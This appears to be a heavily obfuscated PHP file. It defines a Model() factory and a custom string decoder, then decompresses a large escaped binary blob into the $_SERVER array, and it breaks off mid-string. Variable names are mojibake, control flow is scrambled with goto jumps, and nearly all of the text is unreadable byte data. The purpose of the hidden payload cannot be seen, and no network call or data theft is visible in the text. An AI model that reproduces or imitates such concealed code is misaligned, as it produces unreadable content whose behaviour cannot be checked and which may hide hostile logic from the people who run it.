explode($_SERVER[Ö¹ñÒÁ²÷][2], gzinflate(substr($_SERVER[Ö¹ñÒÁ²÷][3], 10, -8))); function Model($bÌ‚øç–®’ = '', $E„¼¶™ñø” = '', $bùÏ«®±  = '') { goto a‹İõˆáŞƒ; Eå—ß‘‚¡: $f¡‡„¬ËÈ§[$aç£ñ¨­Ø¶] = new ModelBase($bÌ‚øç–®’, $E„¼¶™ñø”, $bùÏ«®± ); return $f¡‡„¬ËÈ§[$aç£ñ¨­Ø¶]; goto c†¯ºğÆ¹õ; a‹İõˆáŞƒ: $AŠšì»êê =& $_SERVER[¡Äç²]; static $f¡‡„¬ËÈ§ = array(); $aç£ñ¨­Ø¶ = strtolower($E„¼¶™ñø” . $AŠšì»êê[0] . $bÌ‚øç–®’); goto e½°™Ü³˜ñ; e½°™Ü³˜ñ: if (isset($f¡‡„¬ËÈ§[$aç£ñ¨­Ø¶])) { return $f¡‡„¬ËÈ§[$aç£ñ¨­Ø¶]; } if ($bÌ‚øç–®’) { $bÌ‚øç–®’ = strtoupper($bÌ‚øç–®’[0]) . substr($bÌ‚øç–®’, 1); $D½±Åœ– = $bÌ‚øç–®’ . $AŠšì»êê[1]; if (class_exists($D½±Åœ–)) { $f¡‡„¬ËÈ§[$aç£ñ¨­Ø¶] = new $D½±Åœ–(); return $f¡‡„¬ËÈ§[$aç£ñ¨­Ø¶]; } } if (!$bùÏ«®± ) { $bùÏ«®±  = $GLOBALS[$AŠšì»êê[2]][$AŠšì»êê[3]]; } goto Eå—ß‘‚¡; c†¯ºğÆ¹õ: } goto B¹“«ÀğÔ; e‡ö§³‚: if (!function_exists('_kodDe')) { function _kodDe($AÌØÒªÔ†) { $AÌØÒªÔ† = base64_decode($AÌØÒªÔ†); $c²¶À°¬‹Ö = strlen($AÌØÒªÔ†); $A˜ÃÅÇ­Ê = ''; $c·š¬˜Œë = ord($AÌØÒªÔ†[0]) - 30; for ($BÖä¸¹¶­ = 1; $BÖä¸¹¶­ < $c²¶À°¬‹Ö; $BÖä¸¹¶­ += 2) { if ($BÖä¸¹¶­ + 1 < $c²¶À°¬‹Ö) { $A˜ÃÅÇ­Ê .= chr(ord($AÌØÒªÔ†[$BÖä¸¹¶­ + 1]) + $c·š¬˜Œë); $A˜ÃÅÇ­Ê .= chr(ord($AÌØÒªÔ†[$BÖä¸¹¶­]) + $c·š¬˜Œë); } else { $A˜ÃÅÇ­Ê .= chr(ord($AÌØÒªÔ†[$BÖä¸¹¶­]) + $c·š¬˜Œë); } } return $A˜ÃÅÇ­Ê; } } define(base64_decode('1rnx0sGy9w=='), "\206\215"); $_SERVER[Ö¹ñÒÁ²÷] = explode("\174\2\174\3\174\2", gzinflate(substr("\37\213\10\0\0\0\0\0\0\3\235\175\11\140\33\305\325\60\120\216\162\123\240\334\224\305\41\304\166\126\222\257\134\116\154\107\266\144\133\304\266\34\111\216\343\130\216\262\222\126\322\332\222\126\336\135"."\xc9\x47\x1c\x28\xd\x77\x8\xe5\xa6\x1c\x85\x42\x4a\xcb\x55\x6e\x28\xb4\x4\x4a\xa1\xdc\xa5\x85\x94\xa3\x85\x42\x21\x10\x8e\x42\xa1\x2d\x94\xf2\x35\x85\x7f\xee\x99\x5d\xc9\xb4\xfd\x69\x1d\xcd\xbc\x79\x33\x3b\xc7\x9b\x37\x6f"."\146\336\173\163\355\243\357\334\71\263\333\314\327\146\166\173\353\361\217\160\0\374\355\76\263\47\16\37\267\351\353\273\240\377\276\226\133\371\160\337\156\365\7\265\144\226\375\363\233\127\55\73\262\373\201\103".base64_decode('vvadOzuH3jz48M2B8B9OzVXntpXm1M88ML/x6VtPW/HOVuu1Z6488t6HXo795ba1P9l9c//qu0I=')."\143\217\136\330\365\340\133\273\236\377\151\235\125\277\170\344\326\113\274\313\306\224\277\104\137\372\346\1\117\336\173\343\372\157\27\367\276\166\352\353\275\153\136\150\234\276\171\301\77\137\373\162\325\274\251\353"."\x7f\x1c\x2f\xde\xe5\x39\xe9\x81\xc7\x76\x79\x6d\xf8\xbb\x7\xbd\x7e\xf4\x7e\x1b\x2e\xdc\xeb\xe3\x11\xf5\x84\xf\xde\xbd\x6c\xdf\x5d\x8f\x7f\xe6\xc3\x3d\xf7\xbb\xfe\xb4\xdd\xee\x4e\xdd\xfe\xb5\x53\x1f\x8\x7f\x76\xb3\xef\x94".base64_decode('1rMOr7/w+hvuXfd0d2O7fItvZ9PV12Q++rMyt+nP/ot7n7+qJf3exb3blhztOfh5t6K2JP1HXv8=')."\xef\x1f\x5d\x7e\xe6\x46\x79\x6a\xdd\x5d\xf\xcf\x7c\x67\xe7\xdc\x23\xef\x5c\xf9\xb7\x33\xde\xba\xa3\xf6\xc6\xa5\xdb\x53\x7\x2e\xf9\xac\xf3\xc8\x9f\xa5\xf\xdb\x7a\xf0\x5b\xc5\xd1\x2d\x7\x27\x93\xbb\x3f\xbb\xf1\x4f\xdf\x78"."\xe2\x5f\xae\x3d\x1f\x1b\x3c\xe9\x91\xbf\xde\xd2\xb2\xb6\xf3\x66\xd7\x65\xbf\xf6\xb6\x1e\xfe\xec\xd9\x3f\xff\xec\x17\x7f\xff\xee\xc9\xc3\x17\xdd\x78\xdc\xe2\x45\xde\xa7\x57\x7f\x7b\xf5\x87\x43\xdf\xde\xf4\xd4\x51\xab\xa\x73"."\x6e\xfe\xfb\x35\xdb\x8e\xe9\x1c\xdd\xfb\xca\x3\xf6\xce\x25\x13\xd7\xdf\xf9\xf8\xde\xa7\xea\x66\xec\xf7\x7b\x5c\xf3\xc3\x87\x76\x3e\x72\xf8\xd4\xeb\xbb\xed\xb2\xb\xee\xe8\x66\xfc\x23\xe5\x75\x4b\x52\x27\x35\xd3\x32\x31\x20"."\241\347\123\132\32\207\265\74\376\365\340\37\163\74\253\131\52\16\307\372\202\221\130\170\240\277\337\37\212\304\110\211\142\172\116\117\222\120\101\61\224\34\51\274\240\32\46\370\224\130\134\254\240\27\324\274"."\xd\xc2\x1\x49\xc5\x52\xe2\x8a\x49\x4a\xf2\xb5\xc7\x7c\xfe\xfe\x9e\xe0\x50\x2c\x32\xd4\xef\x27\x18\xf1\xd8\x78\x51\x35\xa6\x70\xc\x5\xc3\x96\x62\x58\x11\x2d\xa7\x32\x8c\x9\x83\xd5\xab\xdd\xdf\x15\xe8\x93\x22\x21\x6f\x5f"."\330\333\21\11\4\373\60\270\43\330\333\33\210\224\303\103\301\236\236\166\157\307\212\362\224\376\220\267\253\327\53\201\372\145\325\230\226\117\351\325\322\72\234\262\116\252\301\201\116\115\315\46\161\60\257\320"."\352\130\123\5\22\212\260\20\30\203\174\61\233\305\221\76\26\42\365\127\123\112\61\113\372\314\47\106\12\206\226\123\150\323\127\250\123\14\212\3\112\321\322\265\174\2\107\374\223\226\241\160\70\250\161\302"."\120\163\152\236\24\25\366\367\370\73\42\22\254\246\324\31\12\366\112\144\50\162\212\151\251\206\64\330\355\17\371\45\130\365\226\171\250\305\363\44\234\157\240\17\164\210\344\355\351\221\146\53\301\122\163\5"."\132\14\316\123\241\260\140\310\347\17\111\355\103\22\357\247\204\236\313\351\171\67\50\5\214\247\45\124\325\37\12\341\200\114\50\270\47\0\207\216\104\202\235\235\141\77\213\221\306\255\354\1\65\151\44\124"."\152\213\45\123\131\53\126\122\262\105\112\254\143\370\167\36\371\41\277\272\111\10\170\134\313\153\105\102\254\244\10\135\147\63\207\4\212\24\133\245\220\34\310\246\223\71\5\46\130\11\7\133\132\361\357\122".strrev('1v@ªM”²Í‡µYiHm"^¯TÂô\'wP)'."\0".'ĞÏŒ¬SÂÊdm†™<µ\'¡>jb°Õ4Á‚').base64_decode('hTRGmxZy9xVzIgqLJjJaNmnQyflVmPWkWNWyQDNMWtOBQlZXkmHVEGrfCYoJFi0RWERonbqR8wE=')."\6\100\172\7\220\275\66\120\41\141\214\22\176\122\350\24\67\141\134\325\303\247\272\276\30\31\136\16\376\251\41\134\54\112\252\226\121\263\331\230\72\251\222\11\222\113\56\60\151\355\75\146\134\313\173\0".base64_decode('BEcDwVhGMTO9yQUxlIsyx6Q66S5kCmQOs2lLKBd2dJ9u+QXemtUTSlZsIg5nLKsQVvNJ2BOkKfo=')."\x44\x1e\xf5\x54\x41\x55\x9\x92\x4f\x96\x92\x52\xaf\x34\x24\x75\x37\x6b\xcd\x94\xac\x0\x91\xa4\xa6\x38\xab\xcb\x58\xb9\x2c\xb\xd1\x66\x32\x98\xc9\x80\xd6\x24\x21\x86\x2a\x12\x57\x27\x2d\xd2\x3b\xd2\xd2\x44\x46\x31\xc0\xb8".base64_decode('tRStlGsx4RiFQlZLKJam5z16wlItl2kZqkJKq1oqQVKAU7cW56LTpkPPW2DeuiKGkjdTquHyE7o=')."\156\226\100\7\63\326\105\321\174\232\131\320\115\15\176\246\131\122\54\113\111\144\340\264\347\305\267\174\5\276\226\317\152\171\265\14\327\233\110\250\246\351\202\131\14\75\353\362\146\263\372\204\53\150\150\151"."\15\344\251\165\124\23\260\244\146\211\362\313\202\146\250\46\215\112\135\275\21\202\14\152\245\272\372\15\45\235\123\232\245\102\61\16\172\206\114\314\12\60\214\115\276\336\54\45\140\124\226\162\105\323\162\31"."\52\340\73\32\130\341\310\340\5\122\256\136\70\236\232\232\164\205\1\173\46\340\306\272\46\11\220\221\104\323\60\264\73\22\351\217\5\72\301\52\334\347\217\365\172\43\35\335\244\332\226\222\246\165\356\1".base64_decode('TJcVSYGrXWCuQULrA33Egf36hGqAD7dPNUtjejKuT7ppEkQOA/ZAkWGPFixXSMmnYf/EpyyVkKM=')."\x59\x4a\xd3\xd5\x24\xb4\xca\x1f\x8a\x85\x83\x9d\x91\x41\x6f\x88\xac\xd4\x79\xd0\xe5\x93\xb4\x50\x58\x48\xd6\x15\x52\x93\xa0\x93\x13\x16\x2d\x5a\x29\xc0\xfe\xa1\x38\x70\x4a\xc0\xd1\xa4\xa9\x70\x9a\xd0\xb4\x9e\x40\x17\xec\x2"."\x9f\xcb\x4\x48\x2e\x11\x8b\x96\xdd\xa3\xe5\x34\x58\x4b\x8b\xa5\xa0\x3e\x3\xcb\x78\x17\xa9\x90\x7\x55\xbd\x25\x9a\xa9\xad\x8e\x26\xe7\xd7\xb8\xc0\xbf\xb5\x35\xc3\x51\x9f\xbb\x76\xa4\xcd\xa3\xf1\x3c\x9e\x7a\x77\xbd\xd4\x50"."\267\120\352\7\162\205\246\144\45\102\57\145\30\165\122\160\205\235\242\172\324\174\332\312\20\121\53\344\137\71\340\17\107\142\275\376\110\167\320\107\162\373\275\44\324\243\343\11\106\153\73\214\177\106\310\70"."\x80\x95\x3e\xad\x26\xf4\xac\x6e\x28\x59\xc8\x46\x28\xd5\xa8\x74\x2a\xa7\xb5\x14\x67\xcb\x1\x20\x8f\x90\x4e\xc3\x8c\x8b\x47\xc2\x5a\xae\x40\xd9\x8c\x95\x29\xe6\xe2\x42\xd0\xc3\x4b\x20\x23\xa\x86\x83\x31\x17\x9d\x2d\x21\xba".base64_decode('QULNHpJlbkMn5ZWecCP4P2eMST2nUEESTT81iecfBtXaUrpVha9JlmHpEGrYUHpVK6OTaZBWaZU=')."\212\254\156\264\226\111\65\253\322\136\312\250\224\327\2\351\250\304\72\257\140\250\51\215\320\44\20\207\0\234\363\122\315\14\201\114\120\74\241\361\101\50\105\162\200\305\331\256\142\162\326\15\43\302\302\332".strrev('ÏAZ88Œdë¤ã9æÎop Ô¤0¤ÎVIÀ ‰‡Ä'."\n".'Ùú;y‹ëÂ)OÄ@¡ƒ!‰$€EöëÓĞ9')."\x9b\xaa\x2b\x41\x4a\x4b\x72\x16\x8a\x31\x96\x3a\xf8\x67\x59\xe\x2e\xbf\x4e\xba\x94\xdc\xb4\x2b\xa7\x5a\x8a\x8b\x55\xdd\xbe\x4a\x49\x11\x71\xb1\xb\x90\x21\xe0\x2c\x2f\xb\x96\x46\xb0\x3d\xa0\xcb\x63\x7f\x30\x4c\x32\xb4\x41"."\50\20\46\342\252\101\352\321\77\100\222\162\302\360\167\371\11\160\37\272\302\51\104\360\360\16\206\51\273\52\2\174\103\233\126\170\33\333\150\175\110\331\223\271\54\227\217\142\232\155\374\142\172\174\24\160".base64_decode('KEB0SqVWu/hYRboDfStivUGfvycW6AMsMFIOH+j3eengi/D2YKTbBh0AfGKVtyfgRPevDoQj4Yo=').strrev('›m˜Ìí]Á+çlÃÍÀ1øìzbÏpRÄ‰/o>œstvğë/¢ÍXßÈS€¤wà6'."\0".'I').strrev('4¨‚Å> ¬c«%†òF§øÕ/.…PÌ…9e°dÊÔ¤^„ÚDBZˆïp¹¤›BT‚X	ÓŒt£')."\16\204\56\362\175\211\60\337\262\32\304\40\116\273\232\322\15\365\253\0\336\224\305\10\303\21\7\363\206\247\201\21\360\242\115\52\240\4\64\42\61\72\27\115\40\336\173\151\165\122\174\203\30\13\202\235"."\xb4\x17\x6e\x2f\x63\x83\xa1\x60\x5f\x17\xc9\x30\x91\x51\x69\x5\x2\xa4\xfb\xab\xa9\x48\x42\x76\x99\x16\x67\x49\x40\x9e\x50\xc8\x5c\xca\xf1\x4e\x1f\xd5\x69\x57\xce\xe0\x9f\x13\xf1\xf\x10\xc1\xc8\xc7\xd5\x3c\xed\xf5\x38\x64"."\314\214\161\320\55\4\230\55\224\251\352\105\366\265\270\256\147\351\74\6\153\55\343\27\154\177\72\152\122\42\231\244\314\151\76\135\265\310\342\20\11\256\360\367\305\50\145\341\230\100\215\30\0\166\174\301".base64_decode('EOkQSx+j+w+cGPKHKRcw1PGiRrvL455PqFgF6w/5vGdtdGJ+9bBrvnsEBGpql+MoiUXdtugJJH8=')."\321\140\271\241\10\122\155\266\325\64\107\75\121\117\165\133\363\260\327\65\255\270\246\353\134\113\134\43\363\243\356\232\371\4\60\262\276\101\156\332\0\21\0\142\333\234\21\360\323\22\155\233\33\165\235\170"."\362\272\345\303\321\221\171\315\363\217\217\272\347\104\47\106\152\153\332\350\167\22\105\3\354\255\22\123\254\252\311\371\325\240\112\100\64\141\50\171\304\22\5\4\232\60\255\25\70\164\375\302\15\24\16\306"."\120\115\363\34\303\256\350\374\221\66\41\237\0\162\176\13\210\56\200\77\147\30\236\327\265\6\266\214\145\205\363\236\320\107\61\237\340\334\25\316\213\270\222\40\174\100\113\347\331\24\2\13\72\333\323\332".base64_decode('Zd/1c/HvBjqQaZUuy/A4yiDUWcxr43SnnlfHSUC3KH3HVWtCpeQB4LY4IA66+QJJQiyLhDTyBb4=')."\xe9\x51\xd1\xe\x80\xb4\xa2\x10\x83\x62\xd7\x4\x8b\x25\xd5\x3c\x19\xa7\xbd\x9\xb6\x99\x50\xa\x6a\x58\x68\x61\x2c\x16\xf1\xb6\xf7\xf8\x63\x94\xc3\x10\x4e\x4c\xe3\x88\x2b\xb6\xb3\xb3\x2d\xd0\x34\xce\x51\xd9\x4e\x92\x8b\xc3"."\346\170\126\102\314\100\122\15\103\67\232\321\271\235\131\54\100\131\14\354\175\54\320\237\22\330\11\113\55\255\22\356\146\302\45\142\142\247\27\24\52\115\300\75\52\223\20\74\325\321\150\161\130\115\216\14"."\3\102\126\134\251\221\365\215\33\152\250\4\354\211\202\377\150\4\363\57\122\343\2\37\77\23\310\132\11\213\55\270\145\307\113\61\306\1\141\25\330\51\201\156\260\165\26\302\271\324\152\351\226\222\145\150"."\60\55\2\41\224\333\320\265\232\354\264\361\0\366\160\46\4\127\147\341\360\15\161\310\76\166\262\304\16\14\204\163\37\0\223\205\50\376\267\245\212\262\351\74\230\10\35\174\221\12\370\134\144\20\275\253"."\135\1\42\300\263\200\106\105\115\5\114\147\213\102\115\275\150\44\124\206\143\23\62\54\305\0\153\26\227\354\240\14\46\234\16\202\232\313\360\64\101\206\153\252\14\244\75\31\36\327\310\134\142\225\371\101"."\200\314\344\117\231\210\245\62\57\235\4\3\76\131\63\175\110\74\106\345\242\44\132\147\53\3\267\325\131\145\112\306\365\357\121\113\152\126\246\265\227\151\243\144\332\2\31\355\67\174\244\66\3\200\76\110"."\155\120\20\60\211\214\14\207\3\216\55\55\5\6\151\67\60\241\132\346\2\267\234\66\364\142\241\237\176\111\210\341\312\20\0\257\51\3\204\164\335\222\351\6\210\5\172\31\7\202\325\341\241\125\174\300"."\171\355\331\362\111\232\200\343\316\72\140\50\114\357\124\112\342\0\127\34\354\274\235\60\370\41\47\77\214\343\342\222\163\43\342\74\344\341\235\310\53\21\121\322\141\341\363\226\222\246\337\256\220\212\303\41"."\65\61\225\340\233\33\237\260\133\262\307\330\320\43\72\254\104\114\225\207\236\21\10\243\265\175\366\336\233\122\66\247\43\102\76\66\142\233\225\272\171\233\202\5\276\342\100\206\20\6\174\120\230\362\24\24".strrev('F`í`³¶9c_¸cÓGä¢!ñqÑÃgdÁ(›I™òŒ.VŞ¶ŸÔ&¨3^‚fYPLÅHVH¦ä')."\260\337\373\265\374\224\226\27\367\356\34\312\171\36\47\12\110\336\74\206\373\170\266\60\346\55\374\154\100\46\147\6\62\330\67\216\11\134\217\357\161\101\355\141\126\241\356\244\44\107\315\351\4\164\331\243".base64_decode('fD4OgG1SzEGqhEgzisF7mc4xSNisVSZE4VEBLaWUOLu35RFmhmlNsWMOIWgvFEd9s0W62e6vUlQ=').base64_decode('nHSa2QN6s1IYtTSiV4wiqUAC8gA9AqPifcxxzACiwkjFbCcSuBpexvqAYJMFI2C44STpgoxNXIU=')."\370\12\5\231\51\16\13\110\5\47\17\264\361\352\112\13\237\223\133\73\240\216\50\377\250\215\357\224\255\116\104\70\41\262\150\35\241\372\44\330\65\272\15\314\331\334\100\374\40\127\65\162\235\260\274\361".strrev('`QV‡§LÜ,ÔŸßé,©Ñï‹‰Ä`|"—Ê+Äj·W{`XïGá8G5-2œŞ»é')."\363\14\46\24\210\272\304\135\66\6\131\155\214\344\222\347\332\60\53\161\162\167\55\342\271\156\276\366\210\53\227\170\51\4\321\170\313\341\45\23\16\11\327\251\71\166\353\204\200\156\323\322\13\74\105\210"."\xe2\x64\x21\x89\x17\x2a\x60\xb1\xce\x47\x35\x4\x2b\x40\x12\xc9\x7\xbc\xb\x11\x2e\xc9\x8b\x24\x68\x4c\xdc\xee\x2c\xc0\x70\x8b\xac\xc8\x6b\x18\x94\x48\x70\xf3\xe0\x9\xe\x0\x8a\x20\x38\x5d\xc3\xf4\x4\xb1\x12\x47\xc6\x85"."\373\113\374\232\24\27\5\77\354\306\13\224\133\111\46\203\364\170\115\14\227\243\212\247\11\225\13\102\67\327\254\50\41\126\31\335\233\315\362\153\60\147\174\326\54\170\256\212\231\104\310\254\331\72\221\20"."\x4c\xef\x1f\x2a\xc1\x98\x4c\xd7\xe9\xa0\x21\x3e\xe3\xf8\x35\xa3\x53\xe4\xb5\x33\x9f\xff\x24\x8e\x95\xcd\x0\x3e\xa0\x95\xe3\x90\x3f\x66\xb4\xbc\x6a\xb2\x95\xc9\x30\x2b\xf1\x99\xff\x24\xdf\xd8\xa4\x5e\xbb\x20\x23\x4a\x30\x64"."\x39\xe4\xcd\x15\xbb\x15\x92\xff\x6c\xb4\x0\xd3\x84\x43\x25\xb0\x87\x2\x0\x71\x1d\x61\x27\x27\x9c\xef\x8\x4b\x25\x5a\x76\x62\x96\x6d\xd9\xf\xa1\x32\x84\xf9\x60\x1b\x62\x30\xff\x70\x8b\x3a\xd\x3d\x17\x8\x82\xf9\x55\x99"."\xe8\x9c\x78\x2a\x3d\x3b\x42\x4c\x6d\x92\x6d\xc9\xc4\x4c\x80\x48\xe0\x2a\x34\x5b\x99\x34\x99\x15\xc5\x97\xac\x7f\x3c\xf9\xd4\x2d\x57\xde\x73\xe9\x83\x3f\xda\x88\xe3\xf7\xfe\xe8\x5a\xc2\x46\xa6\xc6\xac\x7c\x89\xdc\x59\x80\xff".strrev('¯\'°à¸®Õ¼íúz}S¹^Îüv±]—ÓyÇwÜoMÂôJqşsÏc}íôçWÓ¡½s;³1í').strrev('W~—wİWÅĞóŞ(ÍÏ)şù¯„§·÷½Üo—ºôšÇ»^aÎr|û3Ğ¸û¯w|Ÿı×zâ')._kodDe('Ll/TJYYOFujo6MgWj+wOydxP8+zrQ9Tsrx/djzpuD4DpJaLgq72ZLgcnKVZsedbPEyqIU51fvf9f').base64_decode('7PbyLdvDN6+88VrjjtD2C8/f8+LFbx2z18y5M6ccOrXzlYnrbvz+vy4N7/xyyzPfCVc9aL21ePQ=')."\320\67\227\57\230\23\174\347\316\221\366\124\350\257\357\105\136\275\64\174\353\365\341\53\47\163\367\36\175\342\5\201\137\265\177\337\367\255\75\366\237\163\322\156\327\166\255\32\31\377\362\257\67\34\267\356"."\262\176\71\366\356\272\357\355\63\147\363\376\312\330\101\77\270\376\250\346\173\317\273\153\267\303\367\12\137\365\55\137\325\215\33\77\114\275\132\367\376\1\337\375\371\366\263\247\227\275\77\376\360\261\257\64"."\x7e\x7c\xdd\x9f\x86\xbf\x38\x76\xea\xb6\x7\x36\x6d\xd8\xbd\x75\xef\x87\x2f\xde\xf5\xea\x9b\xdc\xd7\xfd\xec\xfa\xa7\x7e\xfa\xda\xd4\x8a\xdf\x67\xaf\xfb\xf5\xa6\x17\x77\x3c\x72\xcd\x6b\x2b\x5f\x7f\xed\xdb\x8d\x7f\x7a\xa7\xe9"."\366\177\217\336\265\72\162\150\307\33\27\236\176\136\325\117\122\157\336\271\266\361\276\107\177\361\243\17\117\65\366\332\170\300\227\107\4\177\161\367\207\237\154\131\264\370\255\327\227\376\373\341\125\67\337\226"."\xf2\x2f\x79\xe5\x8a\x6b\x4f\x5e\xb3\xed\xfd\xb9\x91\x5a\x4d\x7a\xee\xd2\x95\xe1\x9b\xf\x3d\xfa\x67\xbb\x9e\xdc\xd2\xf5\xbb\xdb\x6a\x2e\xb9\x69\xad\x7c\xd9\x2f\x4e\x7a\xf1\x99\x6d\x2b\x57\x7a\x2e\xff\xd5\x3e\x97\xed\x7e\xf5"."\330\300\115\3\177\364\235\163\374\153\346\302\306\115\153\136\150\72\272\70\371\233\147\356\176\246\363\327\67\134\167\160\167\174\227\157\76\233\235\131\53\235\174\356\246\272\63\57\71\310\125\163\323\237\233\123".strrev('ß›Í`:í.û#Ëq<GëtÏ_çÒÜ³ñÚ~ÛÇ¹=‡5´\'¥n»{óñ=Û-ï¼ø¼~_Øùü6W')."\356\330\372\355\342\246\17\36\176\356\324\355\127\277\160\373\332\334\245\143\373\337\276\164\343\136\213\255\7\366\253\51\355\165\366\373\7\135\162\304\56\307\234\30\76\363\211\137\375\176\174\257\63\13\133\316"."\xbc\xe3\xb9\x7b\x6f\x6f\x1d\x5b\x71\xf7\x7b\xca\xba\x6f\xed\xb1\xdf\xf3\xcd\x57\xbd\xb1\xa5\x6e\xd9\xbc\x53\xeb\xcf\x39\x66\xf5\x9b\x71\xcf\x6e\x9e\xdf\xef\x37\xd9\x12\x5c\xfc\xc4\xf8\x4c\xd3\xaf\x36\x54\xcd\x19\x38\xeb\xe5"."\315\215\47\355\224\323\237\174\362\352\355\256\133\236\70\363\347\277\73\375\245\372\335\33\37\371\253\376\101\325\53\227\313\33\276\341\337\263\361\363\107\177\371\146\61\174\130\373\27\147\35\164\105\353\367\366"."\74\342\300\231\157\134\324\172\335\213\267\346\216\210\177\360\306\337\23\73\236\316\275\171\304\57\347\113\243\237\237\274\317\266\147\66\336\267\153\327\352\330\373\175\73\376\164\325\175\37\256\73\364\226\77\264"."\xbd\x70\xc5\xd3\x2f\x5f\x9e\x2c\xce\x48\x1f\x1e\xb5\xa6\xfa\x17\x1b\x5e\xb9\xb2\xe5\xee\xd\xf\x9f\x74\xb5\x16\x54\xe\xb\x8f\xae\xdf\x56\xbf\x78\x9b\xef\x82\x8b\xfe\xbe\xe8\xfc\x5\x8f\x1b\xf9\x15\xd5\x37\x3c\xd3\xf7\x5a"."\323\361\215\37\374\344\234\145\65\53\236\371\165\333\41\167\377\264\261\371\240\177\374\143\345\143\13\156\336\236\174\144\303\225\153\206\176\331\330\370\361\340\334\356\301\313\232\345\256\143\206\174\165\317\274\77"."\331\51\335\275\362\340\365\227\57\52\254\372\315\243\231\137\136\264\110\116\75\376\311\267\177\26\335\362\124\333\275\153\266\257\35\156\31\355\55\335\265\143\331\167\166\371\323\235\215\307\234\366\301\245\267\116"."\x3c\xf6\xf8\x51\xfb\x8c\xff\xe4\xba\x78\xf0\xb2\xe3\x1f\xbd\x35\x75\xf3\xf4\xd5\x1\x63\x38\xf4\xf5\xbb\x8d\xbf\x8d\x1c\xba\xc6\xf3\xf5\xf8\x41\xed\xbb\x48\xbf\xe9\x3f\xf2\xe6\xc6\xcf\x2\x1b\x3f\x3e\x70\x45\x3e\xba\x26\xbf".base64_decode('buElR910uf8bR5/xaN0xN6cuyt4yZ0XXIa/8asmpJ13uu/4H9x/72Bu7nzRxwPSZoze/ftyrg+s=')."\xbf\xe6\xfe\xf9\xeb\x7f\xc\x75\x6d\x7c\x38\x79\x49\xd7\xb1\x27\x5c\xbc\x59\xdd\xf0\xca\x3d\x6f\x9c\xff\xf6\x8d\x4b\x7f\x12\xb9\xe2\xa4\x21\x3d\xf5\xc4\x65\x2d\x87\x3d\xbf\xee\x9f\xae\xa1\xc5\x4f\x7e\x74\xf5\x7e\xef\x75\xdf"."\172\366\300\367\317\252\76\147\323\276\265\261\71\127\137\265\176\377\130\333\216\3\367\170\252\356\236\360\365\153\176\262\145\315\221\373\115\34\165\147\156\110\157\370\101\46\171\374\335\306\310\233\337\264\336\364".base64_decode('DOWU59qven7rQY8/2Dd0z2C2e/62oxceZXy6b1j+Xc3z+h/efXyP3734tzOGNt23+MRXj/7RSM8=')."\163\255\153\37\313\34\360\120\42\360\324\65\236\236\365\257\267\274\160\377\347\103\167\274\176\304\235\167\325\134\174\264\347\350\37\355\172\351\211\373\356\230\34\175\63\165\307\320\300\133\233\33\176\51\33\267"."\x3e\x76\xf5\x49\xf3\xf2\x6f\x48\xd2\xc3\x2b\xa\x33\xc9\x7d\x2f\xfc\xf8\xdf\x9f\x2c\xc8\xfe\xf6\x9d\x89\xdd\x4e\x3a\xe7\xf4\xb\xaf\x5a\xf2\xc6\xf9\x6f\x6c\xff\xb7\xb7\xab\xe5\xbd\xf3\x1e\xbb\x33\xba\xf7\xed\x67\x7f\x6d\xd7".base64_decode('B/745FvdxxZ/+vMtf/l60+3nv3P2aa8uPSa4+qobPvzji28oPz3wTxc999FBq+791g+GzrntsvM=').strrev('¼ÿßâ¼Ç|¸*nßãG²ŞÔ—µÈy¿§g3‡ÿ5óœ—Eîb»¿íØü¾¾.›/ª>ïtLÄº>§')."\356\236\102\351\262\333\206\33\17\362\117\64\66\37\363\215\207\137\354\274\174\44\162\353\367\176\32\173\173\373\372\333\336\355\274\77\162\343\255\267\345\136\135\373\363\375\247\237\335\377\360\227\66\235\264\165"."\345\155\251\251\133\37\351\373\365\151\347\235\32\136\364\373\153\257\70\250\55\132\165\170\353\227\57\154\177\347\224\235\237\177\372\343\123\266\236\374\217\277\274\160\315\353\377\336\261\175\336\113\277\271\172\353".base64_decode('yf/+4Omnf/zlfTMfPfn34BfGp59su/n1L+PqsYs/c5380SttL35nadupW8Z/OXLjK+bCN6774o0=')."\xbe\x3\x2e\x5f\xfe\x8d\x3d\xe\xc\x1f\x76\xe0\x5d\xf9\xfd\x8e\xdb\x65\x63\xe0\x91\xd1\x3b\x4e\x7b\xff\x12\x63\x4e\x70\xde\x74\x74\xfe\xc3\xaf\x2c\x9b\x3e\xe3\x98\x95\x83\x67\xbd\x3f\xf7\xd6\xba\x5d\xbe\xb3\x6b\x4f\x68\xd3"."\xe5\xde\xf3\xfa\xdf\xfd\xcd\x95\x9d\x87\xc\x9e\xdb\xf9\x5e\xe7\x67\xda\x1\xcf\xa7\xeb\xf\xbf\x75\xee\xe1\xa5\xd0\x43\x3f\x79\xf7\xd9\x9b\xe\xd9\xb4\xfb\x3f\xf6\x78\xf6\x9b\xd7\xd5\x5d\x79\x61\xcd\xd7\xff\xf6\xf2\x99\xf3"."\x96\xc\x1d\xff\xd3\xed\x7f\xbd\xe3\x89\x73\x2f\xec\xdc\xf6\xfe\xe9\xf7\x1c\x7e\x44\xe8\xf5\x96\x47\xae\x7a\xe8\x9e\xcf\xff\xf0\x87\xc7\xb6\x6c\x1e\x7c\xe9\x85\x13\x3f\xd9\x37\x75\x7f\x68\xfa\xee\x7b\xef\x78\xf0\xa1\x9f\xb6"."\374\245\251\167\373\47\362\51\253\336\75\343\246\323\237\377\331\17\67\336\341\211\313\235\71\145\301\33\207\17\336\167\361\113\7\137\174\103\343\3\111\367\131\276\325\167\154\255\71\54\174\365\165\247\55\126"."\x96\xde\x71\xf4\xe4\x63\xe9\xee\x43\xbf\xbe\xe0\xb4\x91\x6d\xcf\x77\x6\xee\x3a\xfd\x89\xeb\x6f\x79\x56\x3e\xe1\x5\xf5\xd4\xb7\x5f\xd0\xbb\xbe\x71\xed\xf6\x27\x3e\xb\x2c\xff\xfb\x6d\xbf\x3a\x72\xf5\xdc\xc7\xef\x7b\xf9\x85"."\x23\x3e\x7b\xd2\x3c\xf8\xc4\xd3\x2e\x4b\x8f\x8d\xbc\xf2\xf4\x63\xe7\x1d\xfb\x8f\x57\x3f\x29\xbc\xf8\xfd\x9a\xa7\xbe\x5c\xb9\xbd\xee\x9c\x8f\x86\x7a\x9f\xb9\xff\xba\xfe\xd3\xb7\xd7\x16\xfd\xb1\xd2\xab\x9f\x3f\xa9\xdd\x5e\x5d".base64_decode('u/3kH37/zw9vXPXZG/fe+9Krj27a9K/tmZe/5X5qeOPWTdO/emHH5sApv/1Wfv7D95q3/PZfB54=').base64_decode('c+Vfds7UH/ehNe+m1//4l8WT5trwA1v/+P6zT/xwy/EfP/LLiaFHlNru/sHtl2z+9J5Ueji+75w=')."\301\315\177\77\156\155\377\100\172\316\33\